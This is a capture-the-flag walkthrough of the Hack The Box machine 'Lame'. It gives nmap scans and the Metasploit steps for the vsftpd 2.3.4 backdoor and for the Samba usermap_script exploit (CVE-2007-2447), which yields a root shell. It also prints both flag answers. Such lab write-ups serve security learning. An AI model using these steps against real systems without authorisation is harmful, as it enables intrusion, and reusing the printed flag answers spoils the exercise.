# [Lame](https://app.hackthebox.com/machines/1) | Cyanyde

 Lame is an easy Linux machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.

### How many of the nmap top 1000 TCP ports are open on the remote host?

<code>nmap \<target ip> --top-ports 1000</code> returns:

```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

> There are **4** of the top 1000 ports open on our target machine

### What version of VSFTPd is running on Lame?

<code>nmap -sV \<target ip></code> returns the service version running on each port:

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

> **vsftpd 2.3.4** is running on tcp port 21

### There is a famous backdoor in VSFTPd version 2.3.4, and a Metasploit module to exploit it. Does that exploit work here?

- <code>searchsploit vsftpd 2.3.4</code> shows us that there is a Backdoor Command Execution exploit with a Metasploit module associated with it
- Running `msfconsole` and using <code>search vsftpd 2.3.4</code> shows us that there is 1 module that matches our service version
    - `use 0` or `use exploit/unix/ftp/vsftpd_234_backdoor` will select this module from our search results
    - `show options` will show us the configurable options for this module
    - `set RHOSTS` to the target IP
    - *This module does not support check*
    - `run` or `exploit` to begin launch exploit
    - Returned error: `[*] Exploit completed, but no session was created.`

> vsFTPd backdoor exploit does not work on this host (**no**)

### What version of Samba is running on Lame? Give the numbers up to but not including "-Debian".

- Looking back at our `nmap -sV` results, specific Samba version is not listed
- We can use the `auxiliary/scanner/smb/smb_version` module in Metasploit to find our Samba version
    - `set RHOSTS` to target IP
    - `exploit` or `run` to start

> Our Metasploit module returns Samba **3.0.20**-Debian

### What 2007 CVE allows for remote code execution in this version of Samba via shell metacharacters involving the `SamrChangePassword` function when the "username map script" option is enabled in `smb.conf`?

- `searchsploit samba 3.0.20 -v -www` gives us a link to the [exploit](https://www.exploit-db.com/exploits/16320) on exploit-db.com

> This exploit is **CVE-2007-2447**

### Exploiting CVE-2007-2447 returns a shell as which user?

- Since we discovered a Metasploit module correlated to this CVE, we can leverage it to gain access
    - `search samba 3.0.20` within Metasploit and `use 0` since it is the first result or `use exploit/multi/samba/usermap_script`
    - `set RHOSTS` to target IP and `set RPORT` if necessary
    - `set LHOST` to attack machine IP or VPN IP
    - `run` or `exploit` to start
    - Command shell opened

> `whoami` returns **root**

### Submit the flag located in the makis user's home directory.

- `cd /home/makis` to change into makis' home directory
- `ls -a` to display all files within the directory

>  <details><summary><code>cat user.txt</code> to get the flag: </summary>4411c9e40952e55e551ddadb1ea91542</details>

### Submit the flag located in root's home directory.

- `cd /root` to change into root's directory
- `ls -a` to display all files within directory

>  <details><summary><code>cat root.txt</code> to get the flag: </summary>12814c6f2e2b78b128f42708d0619da9</details>

### Our initial nmap scan showed four open TCP ports. Running netstat -tnlp shows many more ports listening, including ones on 0.0.0.0 and the boxes external IP, so they should be accessible. What must be blocking connection to these ports?

> Since the ports listed (including the port that VSFTPd was running on) are open and listening, our connection to those ports are likely blocked by a **firewall**

### When the VSFTPd backdoor is trigger, what port starts listening?

- The box points to [this](https://www.exploit-db.com/exploits/49757) exploit

> The code uses the function `Telnet(host, 6200)` to open port **6200**
